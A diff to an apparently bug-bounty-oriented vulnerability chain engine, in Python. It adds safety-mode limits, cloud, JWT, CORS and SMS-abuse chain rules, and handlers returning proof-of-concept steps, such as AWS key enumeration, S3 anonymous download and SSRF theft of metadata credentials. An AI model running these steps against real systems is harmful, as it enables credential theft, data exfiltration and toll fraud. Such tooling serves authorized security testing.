@@ -28,6 +28,7 @@ from enum import Enum, auto
 from typing import Any, Callable, Dict, List, Optional, Set
 import asyncio
 import logging
+import os
 import re
 from urllib.parse import urljoin, urlparse
 
@@ -36,6 +37,53 @@ import httpx
 from utils.logger import get_logger
 
 logger = get_logger(__name__)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SAFETY MODE CONFIGURATION
+# Ensures all chain testing respects HackerOne/Bugcrowd program policies
+# ═══════════════════════════════════════════════════════════════════════════════
+
+SAFE_MODE = os.environ.get("PHANTOM_SAFE_MODE", "safe").lower()
+
+# Chain testing limits based on safety mode
+CHAIN_TESTING_LIMITS = {
+    "passive": {
+        "allow_active_testing": False,  # No active exploitation
+        "allow_speculative": True,       # Can suggest attack paths
+        "max_requests_per_chain": 0,     # No additional requests
+    },
+    "safe": {
+        "allow_active_testing": False,   # No active exploitation
+        "allow_speculative": True,        # Can suggest attack paths
+        "max_requests_per_chain": 0,      # No additional requests
+    },
+    "cautious": {
+        "allow_active_testing": True,     # Limited testing
+        "allow_speculative": True,
+        "max_requests_per_chain": 3,      # Max 3 requests to verify
+    },
+    "standard": {
+        "allow_active_testing": True,
+        "allow_speculative": True,
+        "max_requests_per_chain": 10,
+    },
+    "aggressive": {
+        "allow_active_testing": True,
+        "allow_speculative": True,
+        "max_requests_per_chain": 50,     # Requires explicit authorization
+    },
+}
+
+# Get current limits
+CHAIN_LIMITS = CHAIN_TESTING_LIMITS.get(SAFE_MODE, CHAIN_TESTING_LIMITS["safe"])
+
+def is_chain_testing_allowed() -> bool:
+    """Check if active chain testing is allowed in current mode."""
+    return CHAIN_LIMITS.get("allow_active_testing", False)
+
+def is_speculative_allowed() -> bool:
+    """Check if speculative chain suggestions are allowed."""
+    return CHAIN_LIMITS.get("allow_speculative", True)
 
 
 class ChainTrigger(Enum):
@@ -57,6 +105,31 @@ class ChainTrigger(Enum):
     INFO_DISCLOSURE = auto()
     WEAK_CRYPTO = auto()
     SESSION_FIXATION = auto()
+    # ═══════════════════════════════════════════════════════════════════
+    # CLOUD-SPECIFIC TRIGGERS (AWS, CloudFront, Azure, GCP)
+    # ═══════════════════════════════════════════════════════════════════
+    AWS_EXPOSURE = auto()           # AWS credentials or config exposed
+    CLOUDFRONT_BYPASS = auto()      # CloudFront origin bypass
+    S3_MISCONFIGURATION = auto()    # S3 bucket issues
+    CLOUD_METADATA = auto()         # Cloud metadata access
+    API_KEY_EXPOSURE = auto()       # API keys in responses
+    JWT_WEAKNESS = auto()           # JWT vulnerabilities
+    CORS_MISCONFIGURATION = auto()  # CORS issues enabling attacks
+    CACHE_POISONING = auto()        # Cache poisoning opportunities
+    # SPECULATIVE TRIGGERS (based on technology, not confirmed vulns)
+    SPECULATIVE_AWS = auto()        # AWS detected, suggest attack paths
+    SPECULATIVE_API = auto()        # API detected, suggest attack paths
+    # ═══════════════════════════════════════════════════════════════════
+    # COMMUNICATIONS API TRIGGERS (Twilio, SendGrid, Authy)
+    # High-value bounty targets - SMS pumping, toll fraud, enumeration
+    # ═══════════════════════════════════════════════════════════════════
+    PHONE_ENUMERATION = auto()      # CVE-2024-39891 pattern - phone number enumeration
+    SMS_ABUSE_ENDPOINT = auto()     # Unprotected SMS/Voice endpoints
+    TWILIO_CREDENTIAL = auto()      # Twilio Account SID/Auth Token exposure
+    SENDGRID_CREDENTIAL = auto()    # SendGrid API key exposure
+    VERIFY_RATE_LIMIT = auto()      # Rate limit bypass on verification
+    AUTH_NULL_INJECTION = auto()    # CVE-2020-24655 pattern - null injection bypass
+    SPECULATIVE_COMMS = auto()      # Communications platform detected
 
 
 class ChainPriority(Enum):
@@ -149,6 +222,49 @@ class VulnerabilityChainEngine:
         # Information disclosure
         "information_disclosure": ChainTrigger.INFO_DISCLOSURE,
         "sensitive_data_exposure": ChainTrigger.INFO_DISCLOSURE,
+
+        # ═══════════════════════════════════════════════════════════════════
+        # CLOUD-SPECIFIC MAPPINGS
+        # ═══════════════════════════════════════════════════════════════════
+        "aws_exposure": ChainTrigger.AWS_EXPOSURE,
+        "aws_key_exposure": ChainTrigger.AWS_EXPOSURE,
+        "aws_credential": ChainTrigger.AWS_EXPOSURE,
+        "cloudfront_bypass": ChainTrigger.CLOUDFRONT_BYPASS,
+        "cdn_bypass": ChainTrigger.CLOUDFRONT_BYPASS,
+        "origin_bypass": ChainTrigger.CLOUDFRONT_BYPASS,
+        "s3_misconfiguration": ChainTrigger.S3_MISCONFIGURATION,
+        "s3_bucket": ChainTrigger.S3_MISCONFIGURATION,
+        "cloud_metadata": ChainTrigger.CLOUD_METADATA,
+        "metadata_exposure": ChainTrigger.CLOUD_METADATA,
+        "api_key_exposure": ChainTrigger.API_KEY_EXPOSURE,
+        "api_key": ChainTrigger.API_KEY_EXPOSURE,
+        "jwt_weakness": ChainTrigger.JWT_WEAKNESS,
+        "jwt_vulnerability": ChainTrigger.JWT_WEAKNESS,
+        "jwt": ChainTrigger.JWT_WEAKNESS,
+        "cors_misconfiguration": ChainTrigger.CORS_MISCONFIGURATION,
+        "cors": ChainTrigger.CORS_MISCONFIGURATION,
+        "cache_poisoning": ChainTrigger.CACHE_POISONING,
+        "web_cache": ChainTrigger.CACHE_POISONING,
+
+        # ═══════════════════════════════════════════════════════════════════
+        # COMMUNICATIONS API MAPPINGS (Twilio, SendGrid, Authy)
+        # ═══════════════════════════════════════════════════════════════════
+        "phone_enumeration": ChainTrigger.PHONE_ENUMERATION,
+        "phone_number_enumeration": ChainTrigger.PHONE_ENUMERATION,
+        "user_enumeration": ChainTrigger.PHONE_ENUMERATION,
+        "sms_abuse": ChainTrigger.SMS_ABUSE_ENDPOINT,
+        "sms_pumping": ChainTrigger.SMS_ABUSE_ENDPOINT,
+        "toll_fraud": ChainTrigger.SMS_ABUSE_ENDPOINT,
+        "irsf": ChainTrigger.SMS_ABUSE_ENDPOINT,
+        "twilio_credential": ChainTrigger.TWILIO_CREDENTIAL,
+        "twilio_account_sid": ChainTrigger.TWILIO_CREDENTIAL,
+        "twilio_auth_token": ChainTrigger.TWILIO_CREDENTIAL,
+        "sendgrid_key": ChainTrigger.SENDGRID_CREDENTIAL,
+        "sendgrid_api_key": ChainTrigger.SENDGRID_CREDENTIAL,
+        "verify_rate_limit": ChainTrigger.VERIFY_RATE_LIMIT,
+        "otp_brute_force": ChainTrigger.VERIFY_RATE_LIMIT,
+        "auth_null_injection": ChainTrigger.AUTH_NULL_INJECTION,
+        "authentication_bypass": ChainTrigger.AUTH_NULL_INJECTION,
     }
 
     # Chain rules defining what actions to take for each trigger
@@ -435,6 +551,175 @@ class VulnerabilityChainEngine:
             description="Info disclosure → Search for leaked credentials",
             condition=lambda ctx: ctx.get("disclosure_type") == "source_code",
         ),
+
+        # ════════════════════════════════════════════════════════════════════
+        # AWS/CLOUDFRONT-SPECIFIC CHAINS ($10k-$50k bounties on AWS vulns)
+        # ════════════════════════════════════════════════════════════════════
+        ChainRule(
+            trigger=ChainTrigger.AWS_EXPOSURE,
+            action="aws_credential_exploitation",
+            priority=ChainPriority.CRITICAL,
+            description="AWS credentials → Full account takeover",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.CLOUDFRONT_BYPASS,
+            action="cloudfront_origin_access",
+            priority=ChainPriority.CRITICAL,
+            description="CloudFront bypass → Direct origin access",
+            condition=lambda ctx: "cloudfront" in str(ctx.get("technologies", [])).lower(),
+        ),
+        ChainRule(
+            trigger=ChainTrigger.S3_MISCONFIGURATION,
+            action="s3_data_exfiltration",
+            priority=ChainPriority.CRITICAL,
+            description="S3 misconfiguration → Data exfiltration",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.SSRF_CONFIRMED,
+            action="ssrf_aws_imds_v2",
+            priority=ChainPriority.CRITICAL,
+            description="SSRF → AWS IMDSv2 token theft",
+            condition=lambda ctx: any("aws" in str(t).lower() for t in ctx.get("technologies", [])),
+        ),
+        ChainRule(
+            trigger=ChainTrigger.CLOUD_METADATA,
+            action="cloud_metadata_credential_theft",
+            priority=ChainPriority.CRITICAL,
+            description="Cloud metadata → IAM credential extraction",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.API_KEY_EXPOSURE,
+            action="api_key_account_takeover",
+            priority=ChainPriority.CRITICAL,
+            description="API key exposure → Account/service takeover",
+            condition=None,
+        ),
+
+        # ════════════════════════════════════════════════════════════════════
+        # JWT CHAIN ATTACKS ($5k-$20k bounties)
+        # ════════════════════════════════════════════════════════════════════
+        ChainRule(
+            trigger=ChainTrigger.JWT_WEAKNESS,
+            action="jwt_algorithm_confusion",
+            priority=ChainPriority.CRITICAL,
+            description="JWT weakness → Algorithm confusion attack",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.JWT_WEAKNESS,
+            action="jwt_privilege_escalation",
+            priority=ChainPriority.CRITICAL,
+            description="JWT weakness → Forge admin tokens",
+            condition=None,
+        ),
+
+        # ════════════════════════════════════════════════════════════════════
+        # CORS → TOKEN THEFT CHAINS
+        # ════════════════════════════════════════════════════════════════════
+        ChainRule(
+            trigger=ChainTrigger.CORS_MISCONFIGURATION,
+            action="cors_credential_theft",
+            priority=ChainPriority.HIGH,
+            description="CORS misconfiguration → Steal auth tokens via XHR",
+            condition=None,
+        ),
+
+        # ════════════════════════════════════════════════════════════════════
+        # CACHE POISONING CHAINS (HIGH-VALUE on CDNs like CloudFront)
+        # ════════════════════════════════════════════════════════════════════
+        ChainRule(
+            trigger=ChainTrigger.CACHE_POISONING,
+            action="cache_stored_xss",
+            priority=ChainPriority.CRITICAL,
+            description="Cache poisoning → Persistent XSS via CDN cache",
+            condition=lambda ctx: any("cloudfront" in str(t).lower() for t in ctx.get("technologies", [])),
+        ),
+        ChainRule(
+            trigger=ChainTrigger.CACHE_POISONING,
+            action="cache_dos_chain",
+            priority=ChainPriority.HIGH,
+            description="Cache poisoning → DoS via cached error responses",
+            condition=None,
+        ),
+
+        # ════════════════════════════════════════════════════════════════════
+        # SPECULATIVE CHAINS (Technology-based, even without confirmed vulns)
+        # These suggest attack paths based on detected tech stack
+        # ════════════════════════════════════════════════════════════════════
+        ChainRule(
+            trigger=ChainTrigger.SPECULATIVE_AWS,
+            action="speculative_aws_attack_paths",
+            priority=ChainPriority.MEDIUM,
+            description="AWS detected → Suggest cloud-specific attack paths",
+            condition=lambda ctx: any("aws" in str(t).lower() for t in ctx.get("technologies", [])),
+        ),
+        ChainRule(
+            trigger=ChainTrigger.SPECULATIVE_API,
+            action="speculative_api_attack_paths",
+            priority=ChainPriority.MEDIUM,
+            description="API detected → Suggest API-specific attack paths",
+            condition=lambda ctx: "api" in ctx.get("target", "").lower(),
+        ),
+
+        # ════════════════════════════════════════════════════════════════════
+        # COMMUNICATIONS API CHAINS (Twilio, SendGrid, Authy)
+        # High-value bounty targets - $5k-$50k range for critical findings
+        # ════════════════════════════════════════════════════════════════════
+        ChainRule(
+            trigger=ChainTrigger.PHONE_ENUMERATION,
+            action="comms_phone_enumeration_chain",
+            priority=ChainPriority.HIGH,
+            description="Phone enumeration → Mass user data collection (CVE-2024-39891 pattern)",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.SMS_ABUSE_ENDPOINT,
+            action="comms_sms_pumping_chain",
+            priority=ChainPriority.CRITICAL,
+            description="SMS abuse → Toll fraud / IRSF attack demonstration",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.TWILIO_CREDENTIAL,
+            action="comms_twilio_credential_chain",
+            priority=ChainPriority.CRITICAL,
+            description="Twilio credential → Full account takeover / toll fraud",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.SENDGRID_CREDENTIAL,
+            action="comms_sendgrid_credential_chain",
+            priority=ChainPriority.CRITICAL,
+            description="SendGrid credential → Email sending / phishing potential",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.VERIFY_RATE_LIMIT,
+            action="comms_verify_abuse_chain",
+            priority=ChainPriority.HIGH,
+            description="Verify rate limit bypass → OTP brute force / SMS pumping",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.AUTH_NULL_INJECTION,
+            action="comms_auth_bypass_chain",
+            priority=ChainPriority.CRITICAL,
+            description="Auth bypass → Full authentication bypass (CVE-2020-24655 pattern)",
+            condition=None,
+        ),
+        ChainRule(
+            trigger=ChainTrigger.SPECULATIVE_COMMS,
+            action="speculative_comms_attack_paths",
+            priority=ChainPriority.MEDIUM,
+            description="Communications platform detected → Suggest SMS/voice attack paths",
+            condition=lambda ctx: any(
+                d in ctx.get("target", "").lower()
+                for d in ["twilio", "sendgrid", "authy", "segment"]
+            ),
+        ),
     ]
 
     def __init__(self, settings: Optional[Any] = None):
@@ -508,6 +793,42 @@ class VulnerabilityChainEngine:
             # Info disclosure chains
             "info_cve_search": self._info_cve_search,
             "info_credential_search": self._info_credential_search,
+
+            # ════════════════════════════════════════════════════════════════
+            # AWS/CLOUDFRONT-SPECIFIC CHAIN HANDLERS
+            # ════════════════════════════════════════════════════════════════
+            "aws_credential_exploitation": self._aws_credential_exploitation,
+            "cloudfront_origin_access": self._cloudfront_origin_access,
+            "s3_data_exfiltration": self._s3_data_exfiltration,
+            "ssrf_aws_imds_v2": self._ssrf_aws_imds_v2,
+            "cloud_metadata_credential_theft": self._cloud_metadata_credential_theft,
+            "api_key_account_takeover": self._api_key_account_takeover,
+
+            # JWT chain handlers
+            "jwt_algorithm_confusion": self._jwt_algorithm_confusion,
+            "jwt_privilege_escalation": self._jwt_privilege_escalation,
+
+            # CORS chain handlers
+            "cors_credential_theft": self._cors_credential_theft,
+
+            # Cache poisoning handlers
+            "cache_stored_xss": self._cache_stored_xss,
+            "cache_dos_chain": self._cache_dos_chain,
+
+            # Speculative chain handlers
+            "speculative_aws_attack_paths": self._speculative_aws_attack_paths,
+            "speculative_api_attack_paths": self._speculative_api_attack_paths,
+
+            # ════════════════════════════════════════════════════════════════
+            # COMMUNICATIONS API CHAIN HANDLERS (Twilio, SendGrid, Authy)
+            # ════════════════════════════════════════════════════════════════
+            "comms_phone_enumeration_chain": self._comms_phone_enumeration_chain,
+            "comms_sms_pumping_chain": self._comms_sms_pumping_chain,
+            "comms_twilio_credential_chain": self._comms_twilio_credential_chain,
+            "comms_sendgrid_credential_chain": self._comms_sendgrid_credential_chain,
+            "comms_verify_abuse_chain": self._comms_verify_abuse_chain,
+            "comms_auth_bypass_chain": self._comms_auth_bypass_chain,
+            "speculative_comms_attack_paths": self._speculative_comms_attack_paths,
         }
 
     def set_context(self, **kwargs) -> None:
@@ -735,6 +1056,7 @@ class VulnerabilityChainEngine:
             "type": "sqli_rce_chain",
             "name": "SQLi → PostgreSQL COPY TO PROGRAM RCE Chain",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": endpoint,
             "description": "SQL injection can be escalated to RCE via COPY TO PROGRAM",
             "metadata": {
@@ -761,6 +1083,7 @@ class VulnerabilityChainEngine:
             "type": "sqli_rce_chain",
             "name": "SQLi → MSSQL xp_cmdshell RCE Chain",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": endpoint,
             "description": "SQL injection can be escalated to RCE via xp_cmdshell",
             "metadata": {
@@ -804,6 +1127,8 @@ class VulnerabilityChainEngine:
             "name": f"SQLi → Data Extraction Ready ({db_type})",
             "severity": "HIGH",
             "matched_at": endpoint,
+            "url": endpoint,
+            "confidence": 85,  # High confidence - derived from confirmed SQLi
             "description": "SQL injection confirmed - database schema extraction possible",
             "metadata": {
                 "chain_type": "sqli_data_extraction",
@@ -835,6 +1160,8 @@ class VulnerabilityChainEngine:
             "name": f"SQLi → File Read Capability ({db_type})",
             "severity": "HIGH",
             "matched_at": endpoint,
+            "url": endpoint,
+            "confidence": 80,  # High confidence - derived from confirmed SQLi
             "description": "SQL injection may allow reading server files",
             "metadata": {
                 "chain_type": "sqli_file_read",
@@ -855,6 +1182,7 @@ class VulnerabilityChainEngine:
             "type": "lfi_extraction_chain",
             "name": "LFI → System Files Extraction",
             "severity": "HIGH",
+            "confidence": 85,
             "matched_at": endpoint,
             "description": "LFI confirmed - extracting sensitive system files",
             "metadata": {
@@ -896,6 +1224,7 @@ class VulnerabilityChainEngine:
             "type": "lfi_config_extraction_chain",
             "name": "LFI → Application Config Extraction",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": endpoint,
             "description": "LFI can extract application configuration with credentials",
             "metadata": {
@@ -915,6 +1244,7 @@ class VulnerabilityChainEngine:
             "type": "lfi_php_wrapper_chain",
             "name": "LFI → PHP Filter Source Code Disclosure",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": endpoint,
             "description": "LFI with PHP allows source code extraction via php://filter",
             "metadata": {
@@ -939,6 +1269,7 @@ class VulnerabilityChainEngine:
             "type": "lfi_log_poisoning_chain",
             "name": "LFI → Log Poisoning RCE",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": endpoint,
             "description": "LFI can be escalated to RCE via log poisoning",
             "metadata": {
@@ -967,6 +1298,7 @@ class VulnerabilityChainEngine:
             "type": "lfi_proc_chain",
             "name": "LFI → /proc/self/environ Secrets",
             "severity": "HIGH",
+            "confidence": 85,
             "matched_at": endpoint,
             "description": "LFI can read process environment variables for secrets",
             "metadata": {
@@ -986,6 +1318,7 @@ class VulnerabilityChainEngine:
             "type": "idor_enumeration_chain",
             "name": "IDOR → Mass ID Enumeration",
             "severity": "HIGH",
+            "confidence": 85,
             "matched_at": endpoint,
             "description": "IDOR allows enumerating all accessible resources",
             "metadata": {
@@ -1010,6 +1343,7 @@ class VulnerabilityChainEngine:
             "type": "idor_horizontal_chain",
             "name": "IDOR → Horizontal Privilege Escalation",
             "severity": "HIGH",
+            "confidence": 85,
             "matched_at": endpoint,
             "description": "IDOR allows accessing other users' data at same privilege level",
             "metadata": {
@@ -1032,6 +1366,7 @@ class VulnerabilityChainEngine:
             "type": "idor_vertical_chain",
             "name": "IDOR → Vertical Privilege Escalation",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": endpoint,
             "description": "IDOR may allow accessing admin/privileged resources",
             "metadata": {
@@ -1051,6 +1386,7 @@ class VulnerabilityChainEngine:
             "type": "auth_bypass_admin_chain",
             "name": "Auth Bypass → Admin Functionality Access",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": endpoint,
             "description": "Authentication bypass enables testing admin functionality",
             "metadata": {
@@ -1073,6 +1409,7 @@ class VulnerabilityChainEngine:
             "type": "auth_bypass_enum_chain",
             "name": "Auth Bypass → User Enumeration",
             "severity": "HIGH",
+            "confidence": 85,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {
                 "chain_type": "auth_to_enum",
@@ -1088,6 +1425,7 @@ class VulnerabilityChainEngine:
             "type": "default_creds_chain",
             "name": "Default Credentials → Authenticated Scan Ready",
             "severity": "HIGH",
+            "confidence": 85,
             "matched_at": context.get("vulnerable_endpoint"),
             "description": "Default credentials allow full authenticated testing",
             "metadata": {
@@ -1110,6 +1448,7 @@ class VulnerabilityChainEngine:
             "type": "ssrf_cloud_metadata_chain",
             "name": "SSRF → Cloud Metadata Extraction",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": endpoint,
             "description": "SSRF can extract cloud provider metadata and credentials",
             "metadata": {
@@ -1138,6 +1477,7 @@ class VulnerabilityChainEngine:
             "type": "ssrf_port_scan_chain",
             "name": "SSRF → Internal Port Scan",
             "severity": "HIGH",
+            "confidence": 85,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {
                 "chain_type": "ssrf_port_scan",
@@ -1154,6 +1494,7 @@ class VulnerabilityChainEngine:
             "type": "ssrf_internal_services_chain",
             "name": "SSRF → Internal Services Access",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {
                 "chain_type": "ssrf_internal_services",
@@ -1174,6 +1515,7 @@ class VulnerabilityChainEngine:
             "type": "xxe_file_extraction_chain",
             "name": "XXE → Sensitive File Extraction",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {
                 "chain_type": "xxe_file_read",
@@ -1190,6 +1532,7 @@ class VulnerabilityChainEngine:
             "type": "xxe_ssrf_chain",
             "name": "XXE → SSRF to Internal Services",
             "severity": "HIGH",
+            "confidence": 85,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {
                 "chain_type": "xxe_ssrf",
@@ -1205,6 +1548,7 @@ class VulnerabilityChainEngine:
             "type": "xxe_oob_chain",
             "name": "XXE → Out-of-Band Data Exfiltration",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {
                 "chain_type": "xxe_oob",
@@ -1225,6 +1569,7 @@ class VulnerabilityChainEngine:
             "type": "deser_java_chain",
             "name": "Java Deserialization → ysoserial RCE",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {"chain_type": "java_deser_rce", "poc": {"tool": "ysoserial"}},
         }]
@@ -1234,6 +1579,7 @@ class VulnerabilityChainEngine:
             "type": "deser_php_chain",
             "name": "PHP Deserialization → Object Injection RCE",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {"chain_type": "php_deser_rce", "poc": {"tool": "phpggc"}},
         }]
@@ -1243,6 +1589,7 @@ class VulnerabilityChainEngine:
             "type": "deser_python_chain",
             "name": "Python Pickle → RCE",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {"chain_type": "python_pickle_rce"},
         }]
@@ -1252,6 +1599,7 @@ class VulnerabilityChainEngine:
             "type": "deser_dotnet_chain",
             "name": ".NET Deserialization → ysoserial.net RCE",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {"chain_type": "dotnet_deser_rce", "poc": {"tool": "ysoserial.net"}},
         }]
@@ -1261,6 +1609,7 @@ class VulnerabilityChainEngine:
             "type": "ssti_rce_chain",
             "name": "SSTI → Template Engine RCE",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {"chain_type": "ssti_rce"},
         }]
@@ -1270,6 +1619,7 @@ class VulnerabilityChainEngine:
             "type": "cmdi_revshell_chain",
             "name": "Command Injection → Reverse Shell Prepared",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {
                 "chain_type": "cmdi_revshell",
@@ -1285,6 +1635,7 @@ class VulnerabilityChainEngine:
             "type": "cmdi_exfil_chain",
             "name": "Command Injection → Data Exfiltration",
             "severity": "HIGH",
+            "confidence": 85,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {"chain_type": "cmdi_exfil"},
         }]
@@ -1294,6 +1645,7 @@ class VulnerabilityChainEngine:
             "type": "redirect_oauth_chain",
             "name": "Open Redirect → OAuth Token Theft",
             "severity": "HIGH",
+            "confidence": 85,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {"chain_type": "redirect_oauth"},
         }]
@@ -1303,6 +1655,7 @@ class VulnerabilityChainEngine:
             "type": "redirect_phishing_chain",
             "name": "Open Redirect → Phishing Chain",
             "severity": "MEDIUM",
+            "confidence": 75,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {"chain_type": "redirect_phishing"},
         }]
@@ -1312,6 +1665,7 @@ class VulnerabilityChainEngine:
             "type": "info_cve_chain",
             "name": "Version Disclosure → CVE Search",
             "severity": "HIGH",
+            "confidence": 85,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {"chain_type": "version_to_cve"},
         }]
@@ -1321,9 +1675,752 @@ class VulnerabilityChainEngine:
             "type": "info_creds_chain",
             "name": "Source Code Disclosure → Credential Search",
             "severity": "CRITICAL",
+            "confidence": 90,
             "matched_at": context.get("vulnerable_endpoint"),
             "metadata": {"chain_type": "source_to_creds"},
         }]
+
+    # ════════════════════════════════════════════════════════════════════════
+    # AWS/CLOUDFRONT-SPECIFIC CHAIN HANDLERS
+    # High-value attack chains for cloud environments ($10k-$50k bounties)
+    # ════════════════════════════════════════════════════════════════════════
+
+    async def _aws_credential_exploitation(self, finding: Dict, context: Dict) -> List[Dict]:
+        """AWS credential exposure → Full account exploitation chain."""
+        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
+        return [{
+            "type": "aws_credential_chain",
+            "name": "AWS Credentials → Account Takeover Chain",
+            "severity": "CRITICAL",
+            "confidence": 95,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "description": "Exposed AWS credentials can lead to complete account takeover",
+            "metadata": {
+                "chain_type": "aws_credential_exploitation",
+                "bounty_range": "$10,000 - $50,000",
+                "poc": {
+                    "steps": [
+                        "1. Extract AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY",
+                        "2. Configure AWS CLI: aws configure",
+                        "3. Enumerate permissions: aws sts get-caller-identity",
+                        "4. List S3 buckets: aws s3 ls",
+                        "5. Check IAM permissions: aws iam list-attached-user-policies",
+                        "6. Attempt privilege escalation if IAM access",
+                    ],
+                    "impact": [
+                        "S3 bucket access (data breach)",
+                        "EC2 instance access (compute takeover)",
+                        "RDS database access (data breach)",
+                        "Lambda function deployment (code execution)",
+                        "IAM manipulation (permanent backdoor)",
+                    ],
+                    "safe_mode_note": "No actual exploitation - PoC steps only",
+                },
+            },
+        }]
+
+    async def _cloudfront_origin_access(self, finding: Dict, context: Dict) -> List[Dict]:
+        """CloudFront bypass → Direct origin server access."""
+        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
+        target = context.get("target", endpoint)
+        return [{
+            "type": "cloudfront_bypass_chain",
+            "name": "CloudFront Bypass → Origin Server Access",
+            "severity": "HIGH",
+            "confidence": 85,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "description": "Bypassing CloudFront CDN to access unprotected origin server directly",
+            "metadata": {
+                "chain_type": "cloudfront_origin_bypass",
+                "bounty_range": "$5,000 - $15,000",
+                "poc": {
+                    "bypass_techniques": [
+                        "1. X-Forwarded-Host header injection to reach origin",
+                        "2. Host header manipulation to bypass CDN routing",
+                        "3. Origin IP discovery via DNS history/CT logs",
+                        "4. Cache key poisoning to bypass WAF rules",
+                    ],
+                    "test_headers": {
+                        "X-Forwarded-Host": "origin.internal.company.com",
+                        "X-Original-URL": "/admin",
+                        "X-Rewrite-URL": "/api/internal",
+                        "Host": "origin-server.us-east-1.elb.amazonaws.com",
+                    },
+                    "impact": [
+                        "Bypass CloudFront WAF rules",
+                        "Access origin-only endpoints",
+                        "Bypass rate limiting",
+                        "Access internal APIs",
+                    ],
+                },
+            },
+        }]
+
+    async def _s3_data_exfiltration(self, finding: Dict, context: Dict) -> List[Dict]:
+        """S3 misconfiguration → Data exfiltration chain."""
+        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
+        return [{
+            "type": "s3_exfiltration_chain",
+            "name": "S3 Misconfiguration → Data Exfiltration",
+            "severity": "CRITICAL",
+            "confidence": 90,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "description": "S3 bucket misconfiguration allows unauthorized data access",
+            "metadata": {
+                "chain_type": "s3_data_exfiltration",
+                "bounty_range": "$5,000 - $25,000 (depends on data sensitivity)",
+                "poc": {
+                    "steps": [
+                        "1. List bucket contents: aws s3 ls s3://bucket-name --no-sign-request",
+                        "2. Download files: aws s3 cp s3://bucket-name/file.txt . --no-sign-request",
+                        "3. Check for backup files, logs, configuration",
+                        "4. Look for credentials, PII, sensitive business data",
+                    ],
+                    "common_sensitive_files": [
+                        "*.env", "*.config", "*.bak", "*.sql",
+                        "credentials.json", "secrets.yml",
+                        "backup/*", "logs/*", "exports/*",
+                    ],
+                },
+            },
+        }]
+
+    async def _ssrf_aws_imds_v2(self, finding: Dict, context: Dict) -> List[Dict]:
+        """SSRF → AWS IMDSv2 token theft (bypasses v1 protections)."""
+        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
+        return [{
+            "type": "ssrf_imdsv2_chain",
+            "name": "SSRF → AWS IMDSv2 Credential Theft",
+            "severity": "CRITICAL",
+            "confidence": 90,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "description": "SSRF can bypass IMDSv2 to extract temporary AWS credentials",
+            "metadata": {
+                "chain_type": "ssrf_aws_imdsv2",
+                "bounty_range": "$15,000 - $50,000",
+                "poc": {
+                    "steps": [
+                        "1. Get IMDSv2 token: PUT http://169.254.169.254/latest/api/token (X-aws-ec2-metadata-token-ttl-seconds: 21600)",
+                        "2. Use token to access metadata: GET http://169.254.169.254/latest/meta-data/ (X-aws-ec2-metadata-token: TOKEN)",
+                        "3. Get IAM role: GET /latest/meta-data/iam/security-credentials/",
+                        "4. Extract credentials: GET /latest/meta-data/iam/security-credentials/ROLE_NAME",
+                    ],
+                    "imdsv2_bypass": "If SSRF allows custom headers, IMDSv2 can be bypassed",
+                    "impact": [
+                        "Temporary AWS credentials (valid 6 hours)",
+                        "Access to all resources the EC2 role permits",
+                        "Potential lateral movement within AWS",
+                    ],
+                },
+            },
+        }]
+
+    async def _cloud_metadata_credential_theft(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Cloud metadata access → Credential extraction."""
+        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
+        return [{
+            "type": "cloud_metadata_chain",
+            "name": "Cloud Metadata → IAM Credential Extraction",
+            "severity": "CRITICAL",
+            "confidence": 90,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "description": "Access to cloud metadata service exposes temporary credentials",
+            "metadata": {
+                "chain_type": "cloud_metadata_creds",
